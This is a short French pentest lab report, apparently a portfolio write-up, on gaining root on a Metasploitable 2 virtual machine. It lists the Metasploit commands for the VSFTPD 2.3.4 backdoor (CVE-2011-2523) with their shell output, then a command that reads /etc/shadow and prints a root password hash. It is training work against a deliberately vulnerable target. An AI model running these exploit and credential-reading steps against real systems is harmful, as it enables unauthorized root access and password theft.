# METASPLOITABLE 2 - ROOT SHELL (24/02/2026)

Pentester : avalon/matrix 
Lab : VirtualBox 
IP cible : 192.168.56.3

## Résultats du pentest

| Phase | Outil | Service | Résultat | Preuve |
|-------|-------|---------|----------|--------|
| Reconnaissance | Nmap | Tous ports | 27 ports TCP | screenshots/1-nmap.png |
| Exploitation | Metasploit | VSFTPD 21 | ROOT shell | screenshots/3-vsftpd.png |
| Privilèges | id | Root | uid=0(root) | screenshots/4-root.png |
| Post-exploitation | sudo -l | Sudo | (ALL) ALL | screenshots/5-sudo.png |


## Exploit VSFTPD backdoor vers ROOT (10s)


msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.56.3
msf6 > set RPORT 21
msf6 > exploit
[*] Command shell session 1 opened
root@metasploitable:/# whoami
root
root@metasploitable:/# id
uid=0(root) gid=0(root)


## Preuves ROOT obtenues


cat /etc/shadow | grep root
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::

sudo -l
User root may run the following commands on this host:
(ALL) ALL

SUID Binaries détectés :
/usr/bin/nmap /usr/bin/sudo /usr/bin/passwd


## Compétences démontrées
- Reconnaissance Nmap avancée (27 ports)
- Metasploit VSFTPD backdoor (CVE-2011-2523)
- Linux post-exploitation complète
- Rapport technique structuré GitHub

--

Pentest réalisé le 24/02/2026 à Hyères, France-
